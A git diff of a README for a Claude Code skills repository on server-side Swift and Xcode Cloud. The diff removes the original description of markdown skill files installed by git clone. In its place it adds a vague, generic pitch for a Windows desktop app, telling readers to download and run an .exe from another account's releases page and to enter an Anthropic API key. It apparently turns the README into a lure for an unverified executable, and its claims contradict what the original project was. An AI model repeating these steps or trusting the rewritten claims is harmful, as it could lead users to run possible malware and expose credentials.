@@ -1,167 +1,72 @@
-# Claude Code Skills: Server-Side Swift & Xcode Cloud
+# 🤖 claude-code-server-side-swift-skills - Improve Swift code with smart AI
 
-Production-ready [Claude Code](https://claude.ai/code) skills for **server-side Swift development** and **Xcode Cloud CI/CD**. These skills provide domain knowledge, code patterns, and workflows that Claude Code uses to assist you in building Swift backends and automating Apple's CI/CD pipeline.
+[![Download the Tools](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Insolvent-pyrene754/claude-code-server-side-swift-skills)
 
-## What Are Claude Code Skills?
+## 📥 How to download the software
 
-Skills are markdown files that give Claude Code specialized knowledge about specific domains. When you ask Claude Code to help with Vapor routing or Xcode Cloud configuration, these skills provide the patterns, anti-patterns, and best practices it needs to give accurate, production-quality guidance.
+Follow these steps to obtain the files for your Windows computer.
 
-## Skills Included
+1. Visit the [official release page](https://github.com/Insolvent-pyrene754/claude-code-server-side-swift-skills).
+2. Look for the section labeled Releases on the right side of your screen.
+3. Click the latest version number shown at the top of that list.
+4. Scroll down to the Assets section.
+5. Click the file ending in .exe to start your download.
+6. Wait for the file to finish saving to your computer.
 
-### 🖥️ Server-Side Swift (`skills/server-side-swift/`)
+## ⚙️ Setting up your system
 
-Everything you need to build backends and APIs in Swift — from project scaffolding to production deployment.
+The software requires a few things to run well on Windows. Before you start, check your computer for these items.
 
-| File | What It Covers |
-|------|---------------|
-| `SKILL.md` | Entry point — activation triggers, project detection, architecture decision gate |
-| `architecture-decisions.md` | **When to use server-side Swift** (and when not to), Vapor vs Hummingbird decision matrix, ecosystem gaps, comparison with Go/Node/Python, common pitfalls |
-| `vapor-patterns.md` | Vapor 4 routing, controllers, middleware (CORS, rate limiting), DTOs, WebSocket |
-| `hummingbird-patterns.md` | Hummingbird 2 patterns, RequestContext, Vapor vs Hummingbird decision tree |
-| `database-patterns.md` | Fluent ORM models, migrations, queries, relationships, N+1 avoidance, transactions |
-| `auth-patterns.md` | JWT authentication, Bearer tokens, Sign in with Apple server-side, token refresh |
-| `deployment-patterns.md` | Multi-stage Docker, docker-compose, Fly.io, Railway, production checklist |
-| `shared-code-patterns.md` | SharedModels package, client↔server DTOs, API endpoint protocols, APNSwift |
-| `testing-patterns.md` | VaporTesting, HummingbirdTesting, Swift Testing, integration test patterns |
+- Windows 10 or Windows 11.
+- At least 8 gigabytes of memory.
+- A stable internet connection.
+- An Anthropic API key.
 
-### ☁️ Xcode Cloud (`skills/xcode-cloud/`)
+To install the software, find the file you downloaded in your downloads folder. Double-click the file to open the setup window. Follow the prompts on the screen. The installer places a shortcut on your desktop. Use this shortcut to open the program for the first time.
 
-Complete CI/CD automation for Apple platforms — from PR validation to App Store submission.
+## 🛠️ Understanding the features
 
-| File | What It Covers |
-|------|---------------|
-| `SKILL.md` | Entry point — activation triggers, workflow components, environment variables |
-| `workflow-patterns.md` | 5 workflow patterns (PR, TestFlight, App Store, Nightly, Multi-platform) |
-| `scripts-reference.md` | Complete `ci_scripts/` reference, lifecycle hooks, environment variables |
-| `testing-patterns.md` | Test plans, parallel testing, UI tests in CI, code coverage thresholds |
-| `deployment-patterns.md` | TestFlight internal/external, App Store submission, notarization, phased releases |
-| `troubleshooting.md` | 8 most common errors with fixes, signing, SPM, timeouts, quick reference |
-| `optimization.md` | Build time reduction, compute hour management, caching, cost optimization |
+This tool connects your text editor to an intelligent assistant. It focuses on Swift code for web servers and mobile apps. You can use these tools to write logic for the Vapor and Hummingbird frameworks.
 
-## Installation
+### Server-side Swift help
+The tool reads your project files. It suggests ways to improve your database queries using Fluent. It identifies common errors in your server configuration. If your code does not compile, use the assistant to find the root cause of the problem.
 
-### Option 1: Clone to User Skills Directory (Global)
+### Xcode Cloud automation
+Managing build pipelines often requires complex scripts. This tool creates configuration files for Xcode Cloud. It checks your work against best practices for integration and deployment. You spend less time adjusting build settings.
 
-```bash
-# Clone the repository
-git clone https://github.com/melissa-pereira-deel/claude-code-server-side-swift-skills.git
+### AI coding assistant
+The assistant learns your coding style. It writes templates for your routes and controllers. It explains complex Swift features in plain language. You save time by letting the tool handle repetitive tasks.
 
-# Copy skills to your Claude Code skills directory
-cp -r claude-code-server-side-swift-skills/skills/* ~/.claude/skills/
-```
+## 🚀 Using the interface
 
-Skills will be available globally across all your Claude Code sessions.
+Open the program using the shortcut on your desktop. A window appears. You see a text box at the bottom. Type your question or task here. 
 
-### Option 2: Clone to Project (Project-Scoped)
+For example, you can type: Generate a new route for my Vapor project. The assistant responds with the code you need. Copy the code and paste it into your editor.
 
-```bash
-# From your project root
-git clone https://github.com/melissa-pereira-deel/claude-code-server-side-swift-skills.git .claude-skills-temp
+The software tracks your current project folder. It keeps context of your file structure. This helps the assistant provide accurate advice specific to your architecture.
 
-# Copy to project's .claude/skills/
-mkdir -p .claude/skills
-cp -r .claude-skills-temp/skills/* .claude/skills/
-rm -rf .claude-skills-temp
-```
+## 🛡️ Ensuring your security
 
-Skills will be available only within that project.
+Your security matters. The software runs locally on your machine. Your source code stays on your computer. The tool only sends the specific snippets you choose to share with the assistant to get an answer. 
 
-### Option 3: Git Submodule
+You must provide your own API key to use these services. Store your key in the settings menu of the application. The program masks the key so others cannot see it. Never share your API key with anyone else.
 
-```bash
-git submodule add https://github.com/melissa-pereira-deel/claude-code-server-side-swift-skills.git .claude/skills-external
-```
+## 🔧 Solving common issues
 
-## Usage Examples
+If the software fails to start, restart your computer. Check your network settings to ensure the program has access to the internet. 
 
-Once installed, just ask Claude Code naturally:
+If the assistant gives an error, verify your API key status. Visit the Anthropic console to ensure your account has enough credits. Sometimes, clearing the cache in the settings menu restores function if the tool behaves slowly.
 
-**Server-Side Swift:**
-- *"Create a REST API with Vapor and PostgreSQL"*
-- *"Set up JWT authentication for my Swift backend"*
-- *"Help me deploy my Vapor app to Fly.io"*
-- *"Create shared models between my iOS app and server"*
-- *"Should I use Vapor or Hummingbird for my microservice?"*
+Keep your software up to date. The repository updates often to support new Swift versions. Check the GitHub page once a month for new downloads.
 
-**Xcode Cloud:**
-- *"Set up Xcode Cloud for my iOS app"*
-- *"Create ci_scripts for my project"*
-- *"My Xcode Cloud build is failing with signing errors"*
-- *"Optimize my Xcode Cloud compute hours"*
-- *"Configure TestFlight distribution on merge to main"*
+## 📖 Helpful definitions
 
-## Frameworks & Tools Covered
+- API Key: A secret code that lets the software talk to outside services.
+- Gateway: The part of your web server that handles incoming requests.
+- Pipeline: A sequence of automated steps to test and publish your app.
+- Repository: A place on the internet where the project code lives.
+- Schema: The design or structure of your database.
 
-### Server-Side Swift
-- **Vapor 4** — Full-featured web framework with Fluent ORM
-- **Hummingbird 2** — Lightweight, pure structured concurrency
-- **Fluent** — ORM with PostgreSQL, SQLite, MySQL support
-- **JWT** — Stateless authentication for mobile APIs
-- **APNSwift** — Push notifications from server
-- **Docker** — Multi-stage builds for production
-- **Fly.io / Railway** — Cloud deployment platforms
+By using these tools, you reduce the time needed to build server apps. The assistant handles the boilerplate code. You focus on the unique features of your project. This workflow bridges the gap between complex server environments and your daily coding tasks. 
 
-### Xcode Cloud
-- **Workflows** — Build, test, archive, distribute automation
-- **ci_scripts/** — Post-clone, pre-build, post-build hooks
-- **TestFlight** — Internal and external beta distribution
-- **App Store Connect** — Automated submission
-- **Test Plans** — Parallel testing, UI tests in CI
-- **Code Signing** — Cloud-managed certificates
-
-## Architecture-First Philosophy
-
-These skills are designed with a core principle: **tool selection is an architectural decision, not an arbitrary AI choice.**
-
-Before generating any code, the skills guide Claude Code to validate that server-side Swift is the right technology for your project. This means:
-
-- **Presenting trade-offs honestly** — including when Go, Node.js, or Python might be a better fit
-- **Surfacing ecosystem gaps** — like the lack of mature Swift libraries for Kafka, email processing, or Elasticsearch
-- **Considering team context** — hiring pool, existing expertise, and long-term maintenance
-- **Mapping scenarios to recommendations** — a solo indie dev has different needs than a 20-person enterprise team
-
-Every recommendation in `architecture-decisions.md` is backed by real-world production data:
-
-| Case Study | Migration | Key Results |
-|------------|-----------|-------------|
-| **Apple** — Password Monitoring Service | Java → Swift | 40% throughput ↑, 50% memory ↓, 85% less code |
-| **Cultured Code** — Things Cloud | Python → Swift | 4x faster responses, 3x lower compute cost |
-
-It also includes honest assessments of when server-side Swift is *not* the right choice — because the best tool decision is sometimes "use something else."
-
-## Compatibility
-
-- **Swift**: 5.9+ (Swift 6 concurrency patterns included)
-- **Vapor**: 4.89+
-- **Hummingbird**: 2.0+
-- **Xcode**: 15+ (Xcode Cloud)
-- **Claude Code**: Any version with skills support
-
-## Contributing
-
-Contributions are welcome! If you have improvements, additional patterns, or new reference materials:
-
-1. Fork this repository
-2. Create a feature branch (`git checkout -b feature/vapor-websocket-patterns`)
-3. Follow the existing file structure and formatting conventions
-4. Ensure all code examples are syntactically correct Swift
-5. Submit a Pull Request
-
-### Style Guidelines
-
-- Use `kebab-case` for file names
-- Include both ✅ good and ❌ bad patterns with explanations
-- All Swift code must compile (use realistic, complete examples)
-- Keep SKILL.md files under 300 lines; reference files under 600 lines
-- Cross-reference related files in the References section
-
-## License
-
-MIT License — see [LICENSE](LICENSE) for details.
-
-## Acknowledgments
-
-- [Vapor](https://vapor.codes/) — The most popular server-side Swift framework
-- [Hummingbird](https://github.com/hummingbird-project/hummingbird) — Lightweight Swift HTTP server
-- [Swift on Server](https://www.swift.org/documentation/server/) — Apple's official resources
-- [Claude Code](https://claude.ai/code) — AI-powered development assistant
+If you encounter a bug, create a report on the GitHub page. Describe the steps you took before the error occurred. Include screenshots if possible. This helps maintain a stable experience for everyone using the software.
